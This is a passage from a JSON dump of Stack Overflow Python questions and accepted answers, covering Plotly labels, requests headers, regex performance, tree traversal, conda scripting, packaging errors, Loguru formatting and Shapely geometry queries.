I'd expect Python to do a fairly good job of it as well.\nUser @ming noted that OP's solution can be improved a bit:\ndef filter_not_substring_b(candidates):\n    survive = []\n    for a in candidates:\n        for b in candidates:\n            if a in b and a != b:\n                break\n        else:\n            survive.append(a)\n    return survive\n\nThis version of the function is somewhat faster, for me about 10-15%\nFinally, note that this is only just faster than 2b, even though it is very similar to the optimised solution by @ming, but almost 3x slower than their solution. It's unclear to me why that would be - if anyone has fairly certain thoughts on that, please share in the comments:\ndef filter_not_substring_c(candidates):\n    return [a for a in candidates if all(a not in b or a == b for b in candidates)]\n\n"
}
{
    "Id": 70916649,
    "PostTypeId": 1,
    "Title": "How to change the x-axis and y-axis labels in plotly?",
    "Body": "How can I change the x and y-axis labels in plotly because in matplotlib, I can simply use plt.xlabel but I am unable to do that in plotly.\nBy using this code in a dataframe:\nDate = df[df.Country==\"India\"].Date\nNew_cases = df[df.Country==\"India\"]['7day_rolling_avg']\n\npx.line(df,x=Date, y=New_cases, title=\"India Daily New Covid Cases\")\n\nI get this output:\n\nIn this X and Y axis are labeled as X and Y how can I change the name of X and Y axis to \"Date\" and \"Cases\"\n",
    "AcceptedAnswerId": 70916879,
    "AcceptedAnswer": "\nsimple case of setting axis title\n\nupdate_layout(\n    xaxis_title=\"Date\", yaxis_title=\"7 day avg\"\n)\n\nfull code as MWE\nimport pandas as pd\nimport io, requests\n\ndf = pd.read_csv(\n    io.StringIO(\n        requests.get(\n            \"https://raw.githubusercontent.com/owid/covid-19-data/master/public/data/vaccinations/vaccinations.csv\"\n        ).text\n    )\n)\ndf[\"Date\"] = pd.to_datetime(df[\"date\"])\ndf[\"Country\"] = df[\"location\"]\ndf[\"7day_rolling_avg\"] = df[\"daily_people_vaccinated_per_hundred\"]\n\nDate = df[df.Country == \"India\"].Date\nNew_cases = df[df.Country == \"India\"][\"7day_rolling_avg\"]\n\npx.line(df, x=Date, y=New_cases, title=\"India Daily New Covid Cases\").update_layout(\n    xaxis_title=\"Date\", yaxis_title=\"7 day avg\"\n)\n\n\n"
}
{
    "Id": 70923969,
    "PostTypeId": 1,
    "Title": "how to remove the \"User-Agent\" header when send request in python",
    "Body": "I'm using python requests library, I need send a request without a user-agent header.\nI found this question, but it's for Urllib2.\nI'm trying to simulate an Android app which does this when calling a private API.\nI try to set User-Agent to None as in the following code, but it doesn't work. It still sends User-Agent: python-requests/2.27.1.\nIs there any way?\nheaders = requests.utils.default_headers()\nheaders['User-Agent'] = None\nrequests.post(url, *args, headers=headers, **kwargs)\n\n",
    "AcceptedAnswerId": 70924222,
    "AcceptedAnswer": "The requests library is built on top of the urllib3 library.  So, when you pass None User-Agent header to the requests's post method, the urllib3 set their own default User-Agent\nimport requests\n\nr = requests.post(\"https://httpbin.org/post\", headers={\n    \"User-Agent\": None,\n})\n\nprint(r.json()[\"headers\"][\"User-Agent\"])\n\nOutput\npython-urllib3/1.26.7\n\nHere the urllib3 source of connection.py\nclass HTTPConnection(_HTTPConnection, object):\n    ...\n\n    def request(self, method, url, body=None, headers=None):\n        if headers is None:\n            headers = {}\n        else:\n            # Avoid modifying the headers passed into .request()\n            headers = headers.copy()\n        if \"user-agent\" not in (six.ensure_str(k.lower()) for k in headers):\n            headers[\"User-Agent\"] = _get_default_user_agent()\n        super(HTTPConnection, self).request(method, url, body=body, headers=headers) \n\nSo, you can monkey patch it to disable default User-Agent header\nimport requests\nfrom urllib3 import connection\n\n\ndef request(self, method, url, body=None, headers=None):\n    if headers is None:\n        headers = {}\n    else:\n        # Avoid modifying the headers passed into .request()\n        headers = headers.copy()\n    super(connection.HTTPConnection, self).request(method, url, body=body, headers=headers)\n\nconnection.HTTPConnection.request = request\n\n\nr = requests.post(\"https://httpbin.org/post\", headers={\n    \"User-Agent\": None,\n})\n\nprint(r.json()[\"headers\"])\n\nOutput\n{\n'Accept': '*/*', \n'Accept-Encoding': 'gzip, deflate', \n'Content-Length': '0', \n'Host': 'httpbin.org', \n'X-Amzn-Trace-Id': 'Root=1-61f7b53b-26c4c8f6498c86a24ff05940'\n}\n\nAlso, consider to provide browser-like User-Agent like this Mozilla/5.0 (Macintosh; Intel Mac OS X 12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36. Maybe it solves your task with less effort\n"
}
{
    "Id": 70927513,
    "PostTypeId": 1,
    "Title": "Replacing whole string is faster than replacing only its first character",
    "Body": "I tried to replace a character a by b in a given large string. I did an experiment - first I replaced it in the whole string, then I replaced it only at its beginning.\nimport re\n# pattern = re.compile('a')\npattern = re.compile('^a')\nstring = 'x' * 100000\n\npattern.sub('b', string)\n\nI expected that replacing the beginning would have to be much faster then replacing the whole string because you have to check only 1 position instead of 100000. I did some measuring:\npython -m timeit --setup \"import re; p=re.compile('a'); string='x'*100000\" \"p.sub('b', string)\"\n10000 loops, best of 3: 19.1 usec per loop\n\npython -m timeit --setup \"import re; p=re.compile('^a'); string='x'*100000\" \"p.sub('b', string)\"\n1000 loops, best of 3: 613 usec per loop\n\nThe results show that, on the contrary, trying to replace the whole string is about 30x faster. Would you expect such result? Can you explain that?\n",
    "AcceptedAnswerId": 70928164,
    "AcceptedAnswer": "The functions provided in the Python re module do not optimize based on anchors. In particular, functions that try to apply a regex at every position - .search, .sub, .findall etc. - will do so even when the regex can only possibly match at the beginning. I.e., even without multi-line mode specified, such that ^ can only match at the beginning of the string, the call is not re-routed internally. Thus:\n$ # .match only looks at the first position regardless\n$ python -m timeit --setup \"import re; p=re.compile('a'); string='x'*100000\" \"p.match(string)\"\n2000000 loops, best of 5: 155 nsec per loop\n$ python -m timeit --setup \"import re; p=re.compile('^a'); string='x'*100000\" \"p.match(string)\"\n2000000 loops, best of 5: 157 nsec per loop\n$ # .search looks at every position, even if there is an anchor\n$ python -m timeit --setup \"import re; p=re.compile('a'); string='x'*100000\" \"p.search(string)\"\n10000 loops, best of 5: 22.4 usec per loop\n$ # and the anchor only adds complexity to the matching process\n$ python -m timeit --setup \"import re; p=re.compile('^a'); string='x'*100000\" \"p.search(string)\"\n500 loops, best of 5: 746 usec per loop\n\nWhile re does not optimize for anchors, it does optimize for several other things that could occur at the start of a pattern. One of those optimizations is for a pattern starting with a single constant character:\n    if (prefix_len == 1) {\n        /* pattern starts with a literal character */\n        SRE_CHAR c = (SRE_CHAR) prefix[0];\n#if SIZEOF_SRE_CHAR < 4\n        if ((SRE_CODE) c != prefix[0])\n            return 0; /* literal can't match: doesn't fit in char width */\n#endif\n        end = (SRE_CHAR *)state->end;\n        state->must_advance = 0;\n        while (ptr < end) {\n            while (*ptr != c) {\n                if (++ptr >= end)\n                    return 0;\n            }\n            ...\n\nThis optimization performs a simple character comparison to skip candidate matches that don't start with the required character, instead of invoking the full match engine. This optimization is why the unanchored regex was so much faster - there are 3 separate optimizations like this in the code, one for a single constant character, one for a multi-character constant prefix, and one for a character class, but nothing for a ^ anchor.\nI think a reasonable case can be made to file a bug report against this - not having such an obvious optimization implemented clearly violates expectations. Aside from which, while it's easy to replace .search with an anchor using .match, it's not so straightforward to replace .sub with an anchor - you have to .match, check the result, and then call .replace on the string yourself.\nIf you need to anchor to the end of the string and not the start, it gets much more difficult; I recall ancient Perl advice to try reversing the string first, but it's hard in general to write a pattern that matches the reverse of what you want.\n"
}
{
    "Id": 70586483,
    "PostTypeId": 1,
    "Title": "Returning Array from Recursive Binary Tree Search",
    "Body": "Hi I've made a simple Binary Tree and added a pre-order traversal method. After throwing around some ideas I got stuck on finding a way to return each value from the traverse_pre() method in an array.\nclass BST:\n    def __init__(self, val):\n        self.value = val\n        self.left = None\n        self.right = None\n\n    def add_child(self, val):\n        if self.value:\n            if val < self.value:\n                if self.left == None:\n                    self.left = BST(val)\n                else:\n                    self.left.add_child(val)\n            else:\n                if val > self.value:\n                    if self.right == None:\n                        self.right = BST(val)\n                    else:\n                        self.right.add_child(val)\n        else:\n            self.value = val\n\n    def traverse_pre(self):\n        if self.left:\n            self.left.traverse_pre()\n        print(self.value)\n\n        if self.right:\n            self.right.traverse_pre()\n\n\nTree = BST(5)\nTree.add_child(10)\nTree.add_child(8)\nTree.add_child(2)\nTree.add_child(4)\nTree.add_child(7)\n\nTree.traverse_pre()\n\nHow would I modify the traverse_pre() function to return an array consisting of the node values. Is there a good example of this process for me to understand this further, I'm a bit stuck on how values can be appended to an array within recursion.\n",
    "AcceptedAnswerId": 70587563,
    "AcceptedAnswer": "I would not recommend copying the entire tree to an intermediate list using  .append or .extend. Instead use yield which makes your tree iterable and capable of working directly with many built-in Python functions -\nclass BST:\n    # ...\n    def preorder(self):\n        # value\n        yield self.value\n        # left\n        if self.left: yield from self.left.preorder()\n        # right\n        if self.right: yield from self.right.preorder()\n\nWe can simply reorder the lines this to offer different traversals like inorder -\nclass BST:\n    # ...\n    def inorder(self):\n        # left\n        if self.left: yield from self.left.inorder()\n        # value\n        yield self.value\n        # right\n        if self.right: yield from self.right.inorder()\n\nAnd postorder -\nclass BST:\n    # ...\n    def postorder(self):\n        # left\n        if self.left: yield from self.left.postorder()\n        # right\n        if self.right: yield from self.right.postorder()\n        # value\n        yield self.value\n\nUsage of generators provides inversion of control. Rather than the traversal function deciding what happens to each node, the the caller is left with the decision on what to do. If a list is indeed the desired target, simply use list -\nlist(mytree.preorder())\n\n# => [ ... ]\n\nThat said, there's room for improvement with the rest of your code. There's no need to mutate nodes and tangle self context and recursive methods within your BST class directly. A functional approach with a thin class wrapper will make it easier for you to grow the functionality of your tree. For more information on this technique, see this related Q&A.\nIf you need to facilitate trees of significant size, a different traversal technique may be required. Just ask in the comments and someone can help you find what you are looking for.\n"
}
{
    "Id": 70597896,
    "PostTypeId": 1,
    "Title": "Check if conda env exists and create if not in bash",
    "Body": "I have a build script to run a simple python app. I am trying to set it up that it will run for any user that has conda installed and in their PATH. No other prerequisites. I have that pretty much accomplished but would like to make it more efficient for returning users.\nbuild_run.sh\nconda init bash\nconda env create --name RUN_ENV --file ../run_env.yml -q --force\nconda activate RUN_ENV\npython run_app.py\nconda deactivate\n\nI would like to make it that the script checks if RUN_ENV already exists and activates it instead of forcing its creation every time. I tried\nENVS=$(conda env list | awk '{print }' )\nif [[ conda env list = *\"RUN_ENV\"* ]]; then\n   conda activate RUN_ENV\nelse \n   conda env create --name RUN_ENV --file ../run_env.yml -q\n   conda activate RUN_ENV\n   exit\nfi;\npython run_app.py\nconda deactivate\n\nbut it always came back as false and tried to create RUN_ENV\n",
    "AcceptedAnswerId": 70598193,
    "AcceptedAnswer": "update 2022\ni've been receiving upvotes recently. so i'm going to bump up that this method overall is not natively \"conda\" and might not be the best approach. like i said originally, i do not use conda. take my advice at your discretion.\nrather, please refer to @merv's comment in the question suggesting the use of the --prefix flag\nadditionally take a look at the documentation for further details\nNOTE: you can always use a function within your bash script for repeated command invocations with very specific flags\ne.g\nfunction PREFIXED_CONDA(){\n   action=${1};\n   # copy $1 to $action;\n   shift 1;\n   # delete first argument and shift remaining indeces to the left\n   conda ${action} --prefix /path/to/project ${@}\n}\n\n\ni am not sure how conda env list works (i don't use Anaconda); and your current if-tests are vague\nbut i'm going out on a limb and guessing this is what you're looking for\n#!/usr/bin/env bash\n# ...\nfind_in_conda_env(){\n    conda env list | grep \"${@}\" >/dev/null 2>/dev/null\n}\n\nif find_in_conda_env \".*RUN_ENV.*\" ; then\n   conda activate RUN_ENV\nelse \n# ...\n\ninstead of bringing it out into a separate function, you could also do\n# ...\nif conda env list | grep \".*RUN_ENV.*\" >/dev/null 2>&1; then\n# ...\n\nbonus points for neatness and clarity if you use command grouping\n# ...\nif { conda env list | grep 'RUN_ENV'; } >/dev/null 2>&1; then\n# ...\n\nif simply checks the exit code. and grep exits with 0 (success) as long as there's at least one match of the pattern provided; this evaluates to \"true\" in the if statement\n(grep would match and succeed even if the pattern is just 'RUN_ENV' ;) )\n\nthe awk portion of ENVS=$(conda env list | awk '{print }' ) does virtually nothing. i would expect the output to be in tabular format, but {print } does no filtering, i believe you were looking for {print $n} where n is a column number or awk /PATTERN/ {print} where PATTERN is likely RUN_ENV and only lines which have PATTERN are printed.\nbut even so, storing a table in a string variable is going to be messing. you might want an array.\nthen coming to your if-condition, it's plain syntactically wrong.\n\nthe [[ construct is for comparing values: integer, string, regex\nbut here on the left of = we have a command conda env list\n\nwhich i believe is also the contents of $ENVS\n\n\nhence we can assume you meant [[ \"${ENVS}\" == *\"RUN_ENV\"* ]]\n\nor alternately [[ $(conda env list) == *\"RUN_ENV\"* ]]\n\n\nbut still, regex matching against a table... not very intuitive imo\nbut it works... sort of\nthe proper clean syntax for regex matching is\n\n[[ ${value} =~ /PATTERN/ ]]\n\n\n\n"
}
{
    "Id": 70658955,
    "PostTypeId": 1,
    "Title": "How do I display bar plot for values that are zero in plotly?",
    "Body": "How do I make the bar appear when one of the value of y is zero? It just leaves a gap by default. Is there a way I can enable it to plot for zero values? I am able to see a line on the x-axis at y=0 for the same if just plotted using go.Box. I would like to see this in the Bar plot as well.\nSo far, I set the base to zero. But that doesn't plot for y=0 either.\nHere is my sample code. My actual code contains multiple traces, that's why I would like to see the plot for y=0\nHere is the sample python code:\n import plotly.graph_objects as go\n fig = go.Figure()\n fig.add_trace(go.Bar(x=[1, 2, 3], y=[0, 3, 2]))\n fig.show()\n\n",
    "AcceptedAnswerId": 70659144,
    "AcceptedAnswer": "Bar charts come with a line around the bars that by default are set to the same color as the background. In your case '#E5ECF6'. If you change that, the line will appear as a border around each bar that will remain visible even when y = 0 for any given x.\nfig.update_traces(marker_line_color = 'blue', marker_line_width = 12)\n\nIf you set the line color to match that of the bar itself, you'll get this:\nPlot 1: Bars with identical fill and line colors\n\nIf I understand correctly, this should be pretty close to what you're trying to achieve. At least visually. I would perhaps consider adjusting the yaxis range a bit to make it a bit clearer that the y value displayed is in fact 0.\nPlot 2: Adjusted y axis and separate colors\n\nComplete code for Plot 1:\nimport plotly.graph_objects as go\nfig = go.Figure()\nfig.add_trace(go.Bar(x=[1, 2, 3], y=[0, 3, 2], marker_color = 'blue'))\nfig.update_traces(marker_line_color = 'blue', marker_line_width = 12)\nfig.show()\n\nComplete code for Plot 2:\nimport plotly.graph_objects as go\nfig = go.Figure()\nfig.add_trace(go.Bar(x=[1, 2, 3], y=[0, 3, 2], marker_color =  '#00CC96'))\nf = fig.full_figure_for_development(warn=False)\nfig.update_traces(marker_line_color = '#636EFA', marker_line_width = 4)\n\nfig.update_yaxes(range=[-1, 4])\nfig.show()\n\n\nEdit after comments\nJust to verify that the line color is the same as the background color using plotly version 5.4.0\nPlot 1:\n\nPlot 2: Zoomed in\n\n"
}
{
    "Id": 70946286,
    "PostTypeId": 1,
    "Title": "pip-compile raising AssertionError on its logging handler",
    "Body": "I have a dockerfile that currently only installs pip-tools\nFROM python:3.9\n\nRUN pip install --upgrade pip && \\\n    pip install pip-tools\n\nCOPY ./ /root/project\n\nWORKDIR /root/project\n\nENTRYPOINT [\"tail\", \"-f\", \"/dev/null\"]\n\nI build and open a shell in the container using the following commands:\ndocker build -t brunoapi_image .\ndocker run --rm -ti --name brunoapi_container --entrypoint bash brunoapi_image\n\nThen, when I try to run pip-compile inside the container I get this very weird error (full traceback):\nroot@727f1f38f095:~/project# pip-compile\nTraceback (most recent call last):\n  File \"/usr/local/bin/pip-compile\", line 8, in \n    sys.exit(cli())\n  File \"/usr/local/lib/python3.9/site-packages/click/core.py\", line 1128, in __call__\n    return self.main(*args, **kwargs)\n  File \"/usr/local/lib/python3.9/site-packages/click/core.py\", line 1053, in main\n    rv = self.invoke(ctx)\n  File \"/usr/local/lib/python3.9/site-packages/click/core.py\", line 1395, in invoke\n    return ctx.invoke(self.callback, **ctx.params)\n  File \"/usr/local/lib/python3.9/site-packages/click/core.py\", line 754, in invoke\n    return __callback(*args, **kwargs)\n  File \"/usr/local/lib/python3.9/site-packages/click/decorators.py\", line 26, in new_func\n    return f(get_current_context(), *args, **kwargs)\n  File \"/usr/local/lib/python3.9/site-packages/piptools/scripts/compile.py\", line 342, in cli\n    repository = PyPIRepository(pip_args, cache_dir=cache_dir)\n  File \"/usr/local/lib/python3.9/site-packages/piptools/repositories/pypi.py\", line 106, in __init__\n    self._setup_logging()\n  File \"/usr/local/lib/python3.9/site-packages/piptools/repositories/pypi.py\", line 455, in _setup_logging\n    assert isinstance(handler, logging.StreamHandler)\nAssertionError\n\nI have no clue what's going on and I've never seen this error before. Can anyone shed some light into this?\nRunning on macOS Monterey\n",
    "AcceptedAnswerId": 70999908,
    "AcceptedAnswer": "It is a bug, you can downgrade using:\npip install \"pip\nhttps://github.com/jazzband/pip-tools/issues/1558\n"
}
{
    "Id": 70587544,
    "PostTypeId": 1,
    "Title": "\"brew install python\" installs 3.9. Why not 3.10?",
    "Body": "My understanding is that \"brew install python\" installs the latest version of python. Why isn't it pulling 3.10? 3.10 is marked as a stable release.\nI can install 3.10 with \"brew install python@3.10 just fine and can update my PATH so that python and pip point to the right versions. But I am curious why \"brew install python\" its not installing 3.10.\nMy other understanding is that 3.10 is directly compatible with the M1 chips so that is why I want 3.10.\nPlease let me know if I am mistaken.\n",
    "AcceptedAnswerId": 70589077,
    "AcceptedAnswer": "As Henry Schreiner have specified now Python 3.10 is the new default in Brew. Thx for pointing it\n--- Obsolete ---\nThe \"python3\" formula is still 3.9 in the brew system\ncheck the doc here:\nhttps://formulae.brew.sh/formula/python@3.9#default\nThe latest version of the formula for 3.9 also support apple silicon.\nIf you want to use python3.10 you need to run as you described brew install python@3.10\nThe reason why 3.9 is still the official python3 formula is that generally user using the vanilla python3 are not looking for the latest revision but the more stable. in some months the transition will done.\n"
}
{
    "Id": 70977165,
    "PostTypeId": 1,
    "Title": "How to use Loguru defaults + and extra information?",
    "Body": "I'm still reaseaching about Loguru, but I can't find an easy way to do this. I want to use the default options from Loguru, I believe they  are great, but I want to add information to it, I want to add the IP of a request that will be logged.\nIf I try this:\nimport sys\nfrom loguru import logger\nlogger.info(\"This is log info!\")\n# This is directle from Loguru page\nlogger.add(sys.stderr, format=\"{extra[ip]} {extra[user]} {message}\")\ncontext_logger = logger.bind(ip=\"192.168.0.1\", user=\"someone\")\ncontext_logger.info(\"Contextualize your logger easily\")\ncontext_logger.bind(user=\"someone_else\").info(\"Inline binding of extra attribute\")\ncontext_logger.info(\"Use kwargs to add context during formatting: {user}\", user=\"anybody\")\n\nThat logs this:\n\nI know that with logger.remove(0) I will remove the default logs, but I want to use it to obtain something like this: 2022-02-03 15:16:54.920 | INFO     | __main__::79 - XXX.XXX.XX.X - Use kwargs to add context during formatting: anybody, with XXX.XXX.XX.X  being the IP. Using the default config (for color and the rest of thing) and adding a little thing to the format.\nI'm trying to access the default configs, but I haven't been able to import them and use them with logger.add. I think I will have to configure everything from scratch.\nHope someone can help me, thanks.\n",
    "AcceptedAnswerId": 71008024,
    "AcceptedAnswer": "I made the same question in the Github Repository and this was the answer by Delgan (Loguru maintainer):\nI think you simply need to add() your handler using a custom format containing the extra information. Here is an example:\nlogger_format = (\n    \"{time:YYYY-MM-DD HH:mm:ss.SSS} | \"\n    \"{level:  | \"\n    \"{name}:{function}:{line} | \"\n    \"{extra[ip]} {extra[user]} - {message}\"\n)\nlogger.configure(extra={\"ip\": \"\", \"user\": \"\"})  # Default values\nlogger.remove()\nlogger.add(sys.stderr, format=logger_format)\n\nExtra: if you want to use TRACE level use this when adding the configurations:\nlogger.add(sys.stderr, format=logger_format, level=\"TRACE\")\n"
}
{
    "Id": 70610919,
    "PostTypeId": 1,
    "Title": "Installing python in Dockerfile without using python image as base",
    "Body": "I have a python script that uses DigitalOcean tools (doctl and kubectl) I want to containerize. This means my container will need python, doctl, and kubectl installed. The trouble is, I figure out how to install both python and DigitalOcean tools in the dockerfile.\nI can install python using the base image \"python:3\" and I can also install the DigitalOcean tools using the base image \"alpine/doctl\". However, the rule is you can only use one base image in a dockerfile.\nSo I can include the python base image and install the DigitalOcean tools another way:\nFROM python:3\nRUN \nRUN pip install firebase-admin\nCOPY script.py\nCMD [\"python\", \"script.py\"]\n\nOr I can include the alpine/doctl base image and install python3 another way.\nFROM alpine/doctl\nRUN \nRUN pip install firebase-admin\nCOPY script.py\nCMD [\"python\", \"script.py\"]\n\nUnfortunately, I'm not sure how I would do this. Any help in how I can get all these tools installed would be great!\n",
    "AcceptedAnswerId": 70611018,
    "AcceptedAnswer": "just add this with any other thing you want to apt-get install:\nRUN apt-get update && apt-get install -y \\\n    python3.6 &&\\\n    python3-pip &&\\\n\nin alpine it should be something like:\nRUN apk add --update --no-cache python3 && ln -sf python3 /usr/bin/python &&\\\n    python3 -m ensurepip &&\\\n    pip3 install --no-cache --upgrade pip setuptools &&\\\n\n"
}
{
    "Id": 70934699,
    "PostTypeId": 1,
    "Title": "How to fix error when building conda package related to \"Icon\" file?",
    "Body": "I honestly can't figure out what is happening with this error. I thought it was something in my manifest file but apparently it's not.\nNote, this directory is in my Google Drive.\nHere is my MANIFEST.in file:\ngraft soothsayer_utils\ninclude setup.py\ninclude LICENSE.txt\ninclude README.md\nglobal-exclude Icon*\nglobal-exclude *.py[co]\nglobal-exclude .DS_Store\n\nI'm running conda build . in the directory and get the following error:\nPackaging soothsayer_utils\nINFO:conda_build.build:Packaging soothsayer_utils\nINFO conda_build.build:build(2214): Packaging soothsayer_utils\nPackaging soothsayer_utils-2022.01.19-py_0\nINFO:conda_build.build:Packaging soothsayer_utils-2022.01.19-py_0\nINFO conda_build.build:bundle_conda(1454): Packaging soothsayer_utils-2022.01.19-py_0\nnumber of files: 11\nFixing permissions\nPackaged license file/s.\nINFO :: Time taken to mark (prefix)\n        0 replacements in 0 files was 0.11 seconds\n'site-packages/soothsayer_utils-2022.1.19.dist-info/Icon' not in tarball\n'site-packages/soothsayer_utils-2022.1.19.dist-info/Icon\\r' not in info/files\nTraceback (most recent call last):\n  File \"/Users/jespinoz/anaconda3/bin/conda-build\", line 11, in \n    sys.exit(main())\n  File \"/Users/jespinoz/anaconda3/lib/python3.8/site-packages/conda_build/cli/main_build.py\", line 474, in main\n    execute(sys.argv[1:])\n  File \"/Users/jespinoz/anaconda3/lib/python3.8/site-packages/conda_build/cli/main_build.py\", line 463, in execute\n    outputs = api.build(args.recipe, post=args.post, test_run_post=args.test_run_post,\n  File \"/Users/jespinoz/anaconda3/lib/python3.8/site-packages/conda_build/api.py\", line 186, in build\n    return build_tree(\n  File \"/Users/jespinoz/anaconda3/lib/python3.8/site-packages/conda_build/build.py\", line 3008, in build_tree\n    packages_from_this = build(metadata, stats,\n  File \"/Users/jespinoz/anaconda3/lib/python3.8/site-packages/conda_build/build.py\", line 2291, in build\n    newly_built_packages = bundlers[pkg_type](output_d, m, env, stats)\n  File \"/Users/jespinoz/anaconda3/lib/python3.8/site-packages/conda_build/build.py\", line 1619, in bundle_conda\n    tarcheck.check_all(tmp_path, metadata.config)\n  File \"/Users/jespinoz/anaconda3/lib/python3.8/site-packages/conda_build/tarcheck.py\", line 89, in check_all\n    x.info_files()\n  File \"/Users/jespinoz/anaconda3/lib/python3.8/site-packages/conda_build/tarcheck.py\", line 53, in info_files\n    raise Exception('info/files')\nException: info/files\n\nHere's the complete log\nI can confirm that the Icon files do not exist in my soothsayer_utils-2022.1.19.tar.gz file:\n(base) jespinoz@x86_64-apple-darwin13 Downloads % tree soothsayer_utils-2022.1.19\nsoothsayer_utils-2022.1.19\n\u251c\u2500\u2500 LICENSE.txt\n\u251c\u2500\u2500 MANIFEST.in\n\u251c\u2500\u2500 PKG-INFO\n\u251c\u2500\u2500 README.md\n\u251c\u2500\u2500 setup.cfg\n\u251c\u2500\u2500 setup.py\n\u251c\u2500\u2500 soothsayer_utils\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 __init__.py\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 soothsayer_utils.py\n\u2514\u2500\u2500 soothsayer_utils.egg-info\n    \u251c\u2500\u2500 PKG-INFO\n    \u251c\u2500\u2500 SOURCES.txt\n    \u251c\u2500\u2500 dependency_links.txt\n    \u251c\u2500\u2500 requires.txt\n    \u2514\u2500\u2500 top_level.txt\n\n2 directories, 13 files\n\nCan someone help me get conda build to work for my package?\n",
    "AcceptedAnswerId": 71020880,
    "AcceptedAnswer": "there are a few symptoms I would like to suggest looking into:\n\nThere is a WARNING in your error log SetuptoolsDeprecationWarning: setup.py install is deprecated. Use build and pip and other standards-based tools. You have MANIFEST.in, setup.py and setup.cfg probably conflicting between them. Because setup.py is the build script for setuptools. It tells setuptools about your package (such as the name and version) as well as which code files to include. Also, An existing generated MANIFEST will be regenerated without sdist comparing its modification time to the one of MANIFEST.in or setup.py, as explained here.\n\n\nPlease refer to Building and Distributing Packages with Setuptools, also Configuring setup() using setup.cfg files and Quickstart for more information\n\n\nMaybe not so important, but another thing worth looking into is the fact that there are 2 different python distributions being used at different stages, as Python 3.10 is used at: Using pip 22.0.2 from $PREFIX/lib/python3.10/site-packages/pip (python 3.10) (it is also in your conda dependencies) and Python 3.8 is used at: File \"/Users/jespinoz/anaconda3/lib/python3.8/site-packages/conda_build/tarcheck.py\", line 53, in info_files raise Exception('info/files') which is where the error happens. So maybe another configuration conflict related to this.\n\n"
}
{
    "Id": 71053839,
    "PostTypeId": 1,
    "Title": "VSCode Jupyter not connecting to python kernel",
    "Body": "Launching a cell will make this message appear: Connecting to kernel: Python 3.9.6 64-bit: Activating Python Environment 'Python 3.9.6 64-bit'. This message will then stay up loading indefinitely, without anything happening. No actual error message.\nI've already tried searching for this problem, but every other post seem to obtain at least an error message, which isn't the case here. I still looked at some of these, which seemed to indicate the problem might have come from the traitlets package. I tried to downgrade it to what was recommended, but it didn't solve anything, so I reverted the downgrade.\nThe main problem here is that I have no idea what could cause such a problem, without even an error message. If you think additional info could help, please do ask, I have no idea what could be of use right now.\n",
    "AcceptedAnswerId": 71092223,
    "AcceptedAnswer": "Not sure what did the trick but downgrading VSCode to November version and after that reinstalling Jupyter extension worked for me.\n"
}
{
    "Id": 70626218,
    "PostTypeId": 1,
    "Title": "how to find the nearest LINESTRING to a POINT?",
    "Body": "How do I fund the nearest LINESTRING near a point?\nFirst I have a list of LINESTRING and point value. How do I have the nearest LINESTRING to the POINT (5.41 3.9) and maybee the distance?\nfrom shapely.geometry import Point, LineString\n\nline_string = [LINESTRING (-1.15.12 9.9, -1.15.13 9.93), LINESTRING (-2.15.12 8.9, -2.15.13 8.93)]\npoint = POINT (5.41 3.9)\n\n#distance \nline_string [0].distance(point)\n\nSo far I think I got the distance value by doing line_string [0].distance(point) for the first LINESTRING so far but I just want to make sure I am going about it the right way.\n",
    "AcceptedAnswerId": 70627012,
    "AcceptedAnswer": "\nyour sample geometry is invalid for line strings, have modified\nit's simple to achieve with sjoin_nearest()\n\nimport geopandas as gpd\nimport shapely.wkt\nimport shapely.geometry\n\nline_string = [\"LINESTRING (-1.15.12 9.9, -1.15.13 9.93)\", \"LINESTRING (-2.15.12 8.9, -2.15.13 8.93)\"]\n# fix invalid wkt string...\nline_string = [\"LINESTRING (-1.15 9.9, -1.15 9.93)\", \"LINESTRING (-2.15 8.9, -2.15 8.93)\"]\npoint = \"POINT (5.41 3.9)\"\n\ngdf_p = gpd.GeoDataFrame(geometry=[shapely.wkt.loads(point)])\ngdf_l = gpd.GeoDataFrame(geometry=pd.Series(line_string).apply(shapely.wkt.loads))\n\ndf_n = gpd.sjoin_nearest(gdf_p, gdf_l).merge(gdf_l, left_on=\"index_right\", right_index=True)\n\ndf_n[\"distance\"] = df_n.apply(lambda r: r[\"geometry_x\"].distance(r[\"geometry_y\"]), axis=1)\n\ndf_n\n\n\n\n\n\n\n\ngeometry_x\nindex_right\ngeometry_y\ndistance\n\n\n\n\n0\nPOINT (5.41 3.9)\n0\nLINESTRING (-1.15 9.9, -1.15 9.93)\n8.89008\n\n\n\ndistance in meters\n\nuse a CRS that is in meters.  UTM has it's limitations if all points are not in same zone\n\nimport geopandas as gpd\nimport shapely.wkt\nimport shapely.geometry\n\nline_string = [\"LINESTRING (-1.15.12 9.9, -1.15.13 9.93)\", \"LINESTRING (-2.15.12 8.9, -2.15.13 8.93)\"]\n# fix invalid wkt string...\nline_string = [\"LINESTRING (-1.15 9.9, -1.15 9.93)\", \"LINESTRING (-2.15 8.9, -2.15 8.93)\"]\npoint = \"POINT (5.41 3.9)\"\n\ngdf_p = gpd.GeoDataFrame(geometry=[shapely.wkt.loads(point)], crs=\"epsg:4326\")\ngdf_l = gpd.GeoDataFrame(geometry=pd.Series(line_string).apply(shapely.wkt.loads), crs=\"epsg:4326\")\ngdf_p = gdf_p.to_crs(gdf_p.estimate_utm_crs())\ngdf_l = gdf_l.to_crs(gdf_p.crs)\n\n\ndf_n = gpd.sjoin_nearest(gdf_p, gdf_l).merge(gdf_l, left_on=\"index_right\", right_index=True)\n\ndf_n[\"distance\"] = df_n.apply(lambda r: r[\"geometry_x\"].distance(r[\"geometry_y\"]), axis=1)\n\ndf_n\n\n"
}
{
    "Id": 70602290,
    "PostTypeId": 1,
    "Title": "Google app engine deployment fails- Error while finding module specification for 'pip' (AttributeError: module '__main__' has no attribute '__file__')",
